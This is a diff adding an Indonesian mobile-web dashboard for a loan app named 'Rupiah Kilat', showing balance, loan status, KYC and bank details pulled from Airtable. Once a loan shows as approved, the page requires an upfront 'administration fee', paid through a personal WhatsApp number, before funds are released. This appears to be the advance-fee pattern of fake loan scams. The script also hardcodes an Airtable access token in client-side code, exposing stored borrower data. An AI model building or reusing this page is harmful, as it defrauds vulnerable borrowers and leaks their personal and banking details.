@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dashboard Pengguna</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        body {
+            background-color: #f8fafc;
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            display: flex;
+            justify-content: center;
+        }
+        .mobile-container {
+            width: 100%;
+            max-width: 500px;
+            min-height: 100vh;
+            background-color: #ffffff;
+            box-shadow: 0 0 20px rgba(0,0,0,0.05);
+            position: relative;
+            overflow-x: hidden;
+        }
+        .status-badge {
+            padding: 0.25rem 0.6rem;
+            border-radius: 9999px;
+            font-size: 0.7rem;
+            font-weight: 700;
+        }
+        .card-shadow {
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+        }
+        /* Bottom Sheet Logic */
+        .drawer {
+            transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            transform: translateY(100%);
+        }
+        .drawer.active {
+            transform: translateY(0);
+        }
+        .overlay {
+            transition: opacity 0.3s ease-out;
+            pointer-events: none;
+            opacity: 0;
+        }
+        .overlay.active {
+            opacity: 1;
+            pointer-events: auto;
+        }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="mobile-container pb-24">
+        <!-- Navigasi Atas -->
+        <nav class="sticky top-0 bg-white/90 backdrop-blur-md z-40 border-b px-5 py-4 flex justify-between items-center">
+            <div class="flex items-center gap-2">
+                <div class="w-8 h-8 bg-blue-600 rounded-lg flex items-center justify-center shadow-lg shadow-blue-200">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z" />
+                    </svg>
+                </div>
+                <!-- Perubahan Nama di Sini -->
+                <span class="text-xl font-extrabold text-gray-800 tracking-tight">Rupiah Kilat</span>
+            </div>
+            <button onclick="logout()" class="p-2 text-red-500 hover:bg-red-50 rounded-full transition-colors">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1" />
+                </svg>
+            </button>
+        </nav>
+
+        <main class="px-5 py-6 space-y-6">
+            <!-- Overlay Pemuatan -->
+            <div id="loadingOverlay" class="fixed inset-0 bg-white z-50 flex items-center justify-center max-w-[500px] mx-auto">
+                <div class="text-center">
+                    <div class="animate-spin rounded-full h-12 w-12 border-4 border-blue-100 border-t-blue-600 mx-auto"></div>
+                    <p class="mt-4 text-sm text-gray-500 font-semibold">Sinkronisasi Data...</p>
+                </div>
+            </div>
+
+            <!-- Kartu Saldo Utama -->
+            <div class="bg-gradient-to-br from-blue-600 to-indigo-800 rounded-[32px] p-7 text-white card-shadow relative overflow-hidden">
+                <div class="relative z-10">
+                    <div class="flex justify-between items-start">
+                        <div>
+                            <p class="text-blue-100/80 text-[10px] font-bold uppercase tracking-[0.2em]">Saldo Tersedia</p>
+                            <h2 class="text-4xl font-extrabold mt-1 tracking-tight" id="val_saldo_utama">Rp 0</h2>
+                        </div>
+                        <div class="bg-white/10 p-2.5 rounded-2xl backdrop-blur-md border border-white/10">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
+                            </svg>
+                        </div>
+                    </div>
+                    <div class="mt-10 flex justify-between items-end">
+                        <div>
+                            <p class="text-blue-100/70 text-[9px] uppercase font-black tracking-widest">Limit Pinjaman</p>
+                            <p class="text-lg font-bold" id="val_limit_loan">Rp 0</p>
+                        </div>
+                        <button onclick="toggleSheet('withdrawSheet', true)" class="bg-white text-blue-700 px-6 py-3 rounded-2xl text-xs font-black shadow-xl shadow-blue-900/20 active:scale-95 transition-transform">
+                            TARIK DANA
+                        </button>
+                    </div>
+                </div>
+                <div class="absolute -right-6 -bottom-6 w-32 h-32 bg-white/10 rounded-full blur-3xl"></div>
+                <div class="absolute left-1/4 -top-10 w-40 h-40 bg-blue-400/20 rounded-full blur-[60px]"></div>
+            </div>
+
+            <!-- Status Pinjaman -->
+            <div class="space-y-4">
+                <div class="flex justify-between items-center px-1">
+                    <h3 class="font-extrabold text-gray-800 text-lg">Pinjaman Aktif</h3>
+                    <span id="badge_loan_status" class="status-badge bg-gray-100 text-gray-400">MEMUAT...</span>
+                </div>
+                <div class="bg-white p-6 rounded-[28px] border border-gray-100 card-shadow">
+                    <div class="grid grid-cols-2 gap-6">
+                        <div class="space-y-1">
+                            <p class="text-[10px] text-gray-400 font-bold uppercase tracking-wider">Total Pinjaman</p>
+                            <p class="font-bold text-gray-800 text-lg" id="val_loan_amount">Rp 0</p>
+                        </div>
+                        <div class="space-y-1 text-right">
+                            <p class="text-[10px] text-gray-400 font-bold uppercase tracking-wider">Tenor</p>
+                            <p class="font-bold text-gray-800 text-lg" id="val_loan_duration">0 Bulan</p>
+                        </div>
+                        <div class="col-span-2 pt-4 border-t border-gray-50 flex justify-between items-center">
+                            <p class="text-[10px] text-gray-500 font-bold uppercase">Cicilan / Bulan</p>
+                            <p class="font-black text-blue-600 text-xl" id="val_loan_monthly">Rp 0</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- KYC & Bank -->
+            <div class="grid grid-cols-1 gap-4">
+                <div class="bg-white p-5 rounded-[24px] border border-gray-100 shadow-sm flex items-center justify-between">
+                    <div class="flex items-center gap-4">
+                        <div id="icon_kyc" class="p-3 rounded-2xl bg-gray-50 text-gray-400 transition-colors">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" viewBox="0 0 20 20" fill="currentColor">
+                                <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd" />
+                            </svg>
+                        </div>
+                        <div>
+                            <p class="text-[10px] text-gray-400 font-bold uppercase tracking-wider">Identitas Diri</p>
+                            <p class="text-sm font-bold text-gray-700" id="val_kyc_status">Mengecek...</p>
+                        </div>
+                    </div>
+                    <button onclick="toggleSheet('kycSheet', true)" class="text-xs font-extrabold text-blue-600 bg-blue-50 px-4 py-2 rounded-xl transition-colors active:scale-95">DETAIL</button>
+                </div>
+
+                <div class="bg-white p-6 rounded-[24px] border border-gray-100 shadow-sm">
+                    <p class="text-[10px] text-gray-400 font-bold uppercase mb-4 tracking-widest">Rekening Tujuan</p>
+                    <div class="flex items-center justify-between">
+                        <div class="flex items-center gap-4">
+                            <div class="h-12 w-12 bg-blue-50 rounded-2xl flex items-center justify-center border border-blue-100">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-blue-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 14v3m4-3v3m4-3v3M3 21h18M3 10h18M3 7l9-4 9 4M4 10h16v11H4V10z" />
+                                </svg>
+                            </div>
+                            <div>
+                                <p class="text-base font-bold text-gray-800" id="val_bank_name">-</p>
+                                <p class="text-xs font-mono font-medium text-gray-400 mt-0.5" id="val_bank_acc_num">**** **** ****</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="text-center space-y-2 pt-4">
+                <p class="text-[10px] text-gray-400 font-medium">Data dilindungi enkripsi SSL 256-bit</p>
+                <p class="text-[10px] text-gray-300 font-mono">REC-ID: <span id="display_id">...</span></p>
+            </div>
+        </main>
+
+        <!-- DRAWER OVERLAY -->
+        <div id="globalOverlay" class="overlay fixed inset-0 bg-black/60 z-50 flex justify-center items-end" onclick="closeAllSheets()">
+            
+            <!-- SHEET 1: TARIK DANA / ADMIN FEE -->
+            <div id="withdrawSheet" class="drawer bg-white w-full max-w-[500px] rounded-t-[40px] p-8 pb-12 space-y-8 shadow-2xl relative" onclick="event.stopPropagation()">
+                <div class="w-12 h-1.5 bg-gray-200 rounded-full mx-auto -mt-2"></div>
+                
+                <div id="withdraw_content_area" class="space-y-6">
+                    <!-- Dinamis: Antara Form Tarik Biasa atau Admin Fee -->
+                </div>
+
+                <div class="pt-2">
+                    <button onclick="closeAllSheets()" class="w-full py-2 text-gray-400 font-bold text-sm tracking-wide">BATALKAN</button>
+                </div>
+            </div>
+
+            <!-- SHEET 2: DETAIL KYC -->
+            <div id="kycSheet" class="drawer bg-white w-full max-w-[500px] rounded-t-[40px] p-8 pb-12 space-y-6 shadow-2xl relative" onclick="event.stopPropagation()">
+                <div class="w-12 h-1.5 bg-gray-200 rounded-full mx-auto -mt-2"></div>
+                <div class="flex justify-center">
+                    <div id="kyc_illustration" class="w-20 h-20 rounded-3xl flex items-center justify-center"></div>
+                </div>
+                <div class="text-center space-y-4" id="kyc_content_container"></div>
+                <div class="pt-6">
+                    <button onclick="closeAllSheets()" class="w-full bg-gray-900 text-white font-bold py-4 rounded-2xl shadow-lg active:scale-95 transition-all">MENGERTI</button>
+                </div>
+            </div>
+
+        </div>
+
+        <!-- Menu Bawah -->
+        <nav class="fixed bottom-0 left-1/2 -translate-x-1/2 w-full max-w-[500px] bg-white/95 backdrop-blur-md border-t border-gray-100 flex justify-around py-4 px-4 z-40 rounded-t-3xl shadow-[0_-10px_25px_rgba(0,0,0,0.03)]">
+            <button class="flex flex-col items-center gap-1.5 text-blue-600">
+                <div class="p-1"><svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="currentColor" viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg></div>
+                <span class="text-[10px] font-black uppercase tracking-tighter">Beranda</span>
+            </button>
+            <button onclick="window.location.href='apply.html'" class="flex flex-col items-center gap-1.5 text-gray-300 hover:text-blue-500 transition-colors">
+                <div class="p-1"><svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v3m0 0v3m0-3h3m-3 0H9m12 0a9 9 0 11-18 0 9 9 0 0118 0z" /></svg></div>
+                <span class="text-[10px] font-bold uppercase tracking-tighter">Pinjaman</span>
+            </button>
+            <button onclick="window.location.href='profile.html'" class="flex flex-col items-center gap-1.5 text-gray-300 hover:text-blue-500 transition-colors">
+                <div class="p-1"><svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" /></svg></div>
+                <span class="text-[10px] font-bold uppercase tracking-tighter">Profil</span>
+            </button>
+        </nav>
+    </div>
+
+    <script>
+        const AIRTABLE_TOKEN = "patPitTPo10xWFNOy.720741c42e78616c9cc80ca3ba0aa27ff9e53068b1ebd1c77adb21a97d88b4da";
+        const BASE_ID = "appU6nT3gXVjWYhyP";
+        const TABLE_NAME = "datapinjol";
+
+        // MENGGUNAKAN ID SEMENTARA RECDYAAO3U5YEEJZO JIKA LOCALSTORAGE KOSONG
+        let RECORD_ID = localStorage.getItem('id');
+        if (!RECORD_ID) {
+            RECORD_ID = "recdYAaO3U5YEejZO";
+            localStorage.setItem('id', RECORD_ID);
+        }
+
+        let currentUserData = null;
+
+        function toggleSheet(id, show) {
+            const overlay = document.getElementById('globalOverlay');
+            const targetSheet = document.getElementById(id);
+            
+            if (show) {
+                document.querySelectorAll('.drawer').forEach(d => d.classList.remove('active'));
+                overlay.classList.add('active');
+                targetSheet.classList.add('active');
+                
+                if (id === 'kycSheet') updateKycDrawerUI();
+                if (id === 'withdrawSheet') updateWithdrawDrawerUI();
+            } else {
+                overlay.classList.remove('active');
+                targetSheet.classList.remove('active');
+            }
+        }
+
+        function closeAllSheets() {
+            document.getElementById('globalOverlay').classList.remove('active');
+            document.querySelectorAll('.drawer').forEach(d => d.classList.remove('active'));
+        }
+
+        async function fetchUserData() {
+            setSafeText('display_id', RECORD_ID);
+            try {
+                const response = await fetch(`https://api.airtable.com/v0/${BASE_ID}/${TABLE_NAME}/${RECORD_ID}`, {
+                    headers: { 'Authorization': `Bearer ${AIRTABLE_TOKEN}` }
+                });
+                if (!response.ok) throw new Error("Gagal mengambil data");
+                const data = await response.json();
+                currentUserData = data.fields;
+                renderData(currentUserData);
+            } catch (error) {
+                console.error("Fetch Error:", error);
+            } finally {
+                document.getElementById('loadingOverlay')?.classList.add('hidden');
+            }
+        }
+
+        function renderData(f) {
+            if (!f) return;
+            setSafeText('val_saldo_utama', formatRupiah(f.saldo_utama));
+            setSafeText('val_limit_loan', formatRupiah(f.limit_loan));
+            setSafeText('val_loan_amount', formatRupiah(f.loan_amount));
+            setSafeText('val_loan_monthly', formatRupiah(f.loan_monthly_installment));
+            setSafeText('val_loan_duration', (f.loan_duration_installment || 0) + " Bulan");
+            
+            const statusObj = document.getElementById('badge_loan_status');
+            if (statusObj) {
+                const status = (f.loan_status || "TIDAK ADA").toUpperCase();
+                statusObj.textContent = status;
+                statusObj.className = "status-badge";
+                if(status === "DISETUJUI") statusObj.classList.add("bg-green-100", "text-green-600");
+                else if(status === "DITINJAU") statusObj.classList.add("bg-amber-100", "text-amber-600");
+                else if(status === "DITOLAK") statusObj.classList.add("bg-red-100", "text-red-700");
+                else statusObj.classList.add("bg-gray-100", "text-gray-400");
+            }
+
+            setSafeText('val_kyc_status', f.kyc_status || "Belum Verifikasi");
+            setSafeText('val_bank_name', f.bank_name || "-");
+            setSafeText('val_bank_acc_num', f.bank_account_number || "**** **** ****");
+        }
+
+        function updateWithdrawDrawerUI() {
+            const container = document.getElementById('withdraw_content_area');
+            const status = (currentUserData.loan_status || "").toLowerCase();
+            const userName = currentUserData.user_name || "Nasabah";
+            const adminFee = formatRupiah(currentUserData.loan_admin_fee);
+            const loanAmount = formatRupiah(currentUserData.loan_amount);
+
+            if (status === "disetujui") {
+                container.innerHTML = `
+                    <div class="text-center space-y-4">
+                        <div class="w-20 h-20 bg-green-100 text-green-600 rounded-3xl flex items-center justify-center mx-auto shadow-sm">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="h-10 w-10" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
+                            </svg>
+                        </div>
+                        <h3 class="text-2xl font-black text-gray-800">Hai ${userName},</h3>
+                        <p class="text-sm text-gray-500 font-medium leading-relaxed">
+                            Pinjaman Anda sudah siap dicairkan.
+                        </p>
+                        <div class="bg-gray-50 p-5 rounded-[28px] border-2 border-dashed border-gray-200">
+                            <p class="text-[10px] text-gray-400 font-black uppercase tracking-widest mb-1">Biaya Administrasi</p>
+                            <p class="text-2xl font-black text-blue-600">${adminFee}</p>
+                        </div>
+                        <p class="text-sm text-gray-600 font-medium px-4">
+                            Silakan selesaikan biaya admin tersebut agar proses pencairan dapat segera dilakukan. Klik tombol di bawah untuk instruksi.
+                        </p>
+                        <button onclick="sendAdminFeeWA('${userName}', '${adminFee}', '${loanAmount}')" class="w-full bg-blue-600 text-white font-black py-5 rounded-[24px] shadow-2xl shadow-blue-300 active:scale-95 transition-all text-lg tracking-tight flex items-center justify-center gap-3">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="currentColor" viewBox="0 0 24 24"><path d="M12.031 6.172c-3.181 0-5.767 2.586-5.768 5.766-.001 1.298.38 2.27 1.019 3.287l-.582 2.128 2.182-.573c.978.58 1.911.928 3.145.929 3.178 0 5.767-2.587 5.768-5.766 0-3.18-2.587-5.771-5.764-5.771zm3.392 8.244c-.144.405-.837.774-1.17.824-.299.045-.677.063-1.092-.069-.252-.08-.575-.187-.988-.365-1.739-.747-2.874-2.512-2.96-2.626-.087-.115-.708-.941-.708-1.797 0-.855.448-1.274.607-1.446.159-.172.346-.215.461-.215.115 0 .231 0 .331.005.109.004.257-.041.402.31.144.35.491 1.201.534 1.288.043.086.072.187.014.302-.058.115-.087.187-.173.287-.086.1-.181.224-.257.302-.086.086-.176.18-.076.352.099.172.441.728.946 1.178.65.58 1.196.76 1.368.846.172.086.273.072.374-.043.101-.115.432-.504.548-.677.115-.172.23-.144.389-.086.158.058 1.008.475 1.181.562.172.086.287.129.331.201.044.072.044.419-.1.824z"/></svg>
+                            BAYAR SEKARANG
+                        </button>
+                    </div>
+                `;
+            } else {
+                // Tampilan Default Withdraw (Tanpa Pinjaman Disetujui)
+                container.innerHTML = `
+                    <div class="text-center space-y-2">
+                        <h3 class="text-2xl font-black text-gray-800">Tarik Dana</h3>
+                        <p class="text-sm text-gray-400 font-medium">Saldo akan dikirim ke rekening terdaftar</p>
+                    </div>
+                    <div class="bg-blue-600 p-6 rounded-[32px] text-white flex justify-between items-center shadow-xl shadow-blue-200">
+                        <div>
+                            <p class="text-[10px] text-blue-100 font-black uppercase tracking-[0.2em]">Jumlah Penarikan</p>
+                            <p class="text-2xl font-black mt-1">${formatRupiah(currentUserData.saldo_utama)}</p>
+                        </div>
+                        <div class="bg-white/20 p-3 rounded-2xl">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="h-7 w-7" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 9V7a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2m2 4h10a2 2 0 002-2v-6a2 2 0 00-2-2H9a2 2 0 00-2 2v6a2 2 0 002 2zm7-5a2 2 0 11-4 0 2 2 0 014 0z" />
+                            </svg>
+                        </div>
+                    </div>
+                    <div class="space-y-4">
+                        <p class="text-[10px] text-gray-400 font-black uppercase tracking-widest px-1">Rekening Tujuan</p>
+                        <div class="flex items-center gap-5 border-2 border-gray-50 p-5 rounded-[28px] bg-gray-50/50">
+                            <div class="w-14 h-14 bg-white rounded-2xl flex items-center justify-center shadow-sm border border-gray-100">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="h-7 w-7 text-blue-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 14v3m4-3v3m4-3v3M3 21h18M3 10h18M3 7l9-4 9 4M4 10h16v11H4V10z" />
+                                </svg>
+                            </div>
+                            <div>
+                                <p class="font-extrabold text-gray-800 text-lg leading-tight">${currentUserData.bank_name || "-"}</p>
+                                <p class="text-sm font-mono font-bold text-gray-400 mt-1">${currentUserData.bank_account_number || "**** ****"}</p>
+                            </div>
+                        </div>
+                    </div>
+                    <button class="w-full bg-blue-600 hover:bg-blue-700 text-white font-black py-5 rounded-[24px] shadow-2xl shadow-blue-300 active:scale-95 transition-all text-lg tracking-tight">KONFIRMASI SEKARANG</button>
+                `;
+            }
+        }
+
+        function sendAdminFeeWA(name, fee, amount) {
+            const now = new Date();
+            const dateStr = now.toLocaleDateString('id-ID') + ' ' + now.toLocaleTimeString('id-ID');
+            const message = `Halo Admin,\n\nSaya ingin meminta instruksi pembayaran biaya admin untuk pencairan pinjaman.\nRef ID: ${dateStr}\n\nNama: ${name}\nPinjaman: ${amount}\n\nTerima kasih.`;
+            const phone = "62895405425587";
+            const url = `https://wa.me/${phone}?text=${encodeURIComponent(message)}`;
+            window.open(url, '_blank');
+        }
+
+        function updateKycDrawerUI() {
+            if (!currentUserData) return;
+            const kycStatus = (currentUserData.kyc_status || "").toLowerCase();
+            const userName = currentUserData.user_name || "Nasabah";
+            const container = document.getElementById('kyc_content_container');
+            const iconBox = document.getElementById('kyc_illustration');
+            
+            let html = "", icon = "", iconClass = "";
+
+            if (!kycStatus || kycStatus === "" || kycStatus === "tidak ada") {
+                icon = `<svg xmlns="http://www.w3.org/2000/svg" class="h-10 w-10" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" /></svg>`;
+                iconClass = "bg-blue-50 text-blue-600";
+                html = `<h3 class="text-xl font-bold text-gray-800">Hai ${userName} 👋</h3><p class="text-sm text-gray-500 leading-relaxed font-medium">Tinggal 1 langkah lagi untuk mengaktifkan limit pinjaman Anda! Lengkapi data KYC sekarang agar:</p><div class="space-y-2 text-left bg-gray-50 p-4 rounded-2xl"><p class="text-sm font-bold text-gray-700">✅ Limit pinjaman aktif</p><p class="text-sm font-bold text-gray-700">✅ Proses lebih cepat</p><p class="text-sm font-bold text-gray-700">✅ Pencairan tanpa hambatan</p></div><p class="text-xs text-blue-600 font-bold italic">Lengkapi KYC di halaman profil pada aplikasi</p>`;
+            } else if (kycStatus === "unverified") {
+                icon = `<svg xmlns="http://www.w3.org/2000/svg" class="h-10 w-10" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>`;
+                iconClass = "bg-amber-50 text-amber-600";
+                html = `<h3 class="text-xl font-bold text-gray-800">Halo ${userName},</h3><p class="text-sm text-gray-500 leading-relaxed font-medium">Terima kasih. Data KYC Anda sudah kami terima dan saat ini sedang dalam proses peninjauan oleh admin.</p><p class="text-sm text-gray-500 font-medium">Mohon menunggu, kami akan menginformasikan hasilnya setelah proses selesai.</p>`;
+            } else if (kycStatus === "verified") {
+                icon = `<svg xmlns="http://www.w3.org/2000/svg" class="h-10 w-10 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>`;
+                iconClass = "bg-green-500 text-white shadow-lg shadow-green-100";
+                html = `<h3 class="text-xl font-bold text-gray-800">Selamat ${userName} 🎉</h3><p class="text-sm text-gray-500 leading-relaxed font-medium">Akun Anda telah resmi terverifikasi!</p><p class="text-sm font-bold text-gray-700">Limit pinjaman Anda kini aktif dan siap digunakan. Ajukan pinjaman sekarang melalui aplikasi.</p>`;
+            }
+
+            iconBox.innerHTML = icon;
+            iconBox.className = `w-20 h-20 rounded-3xl flex items-center justify-center ${iconClass}`;
+            container.innerHTML = html;
+        }
+
+        function formatRupiah(num) {
+            if (num === undefined || num === null || isNaN(num)) return "Rp 0";
+            return "Rp " + parseInt(num).toLocaleString('id-ID');
+        }
+
+        function setSafeText(id, text) {
+            const el = document.getElementById(id);
+            if (el) el.textContent = text || "-";
+        }
+
+        function logout() {
+            localStorage.removeItem('id');
+            window.location.replace("./login.html");
+        }
+
+        window.addEventListener('DOMContentLoaded', fetchUserData);
+    </script>
+</body>
+</html>
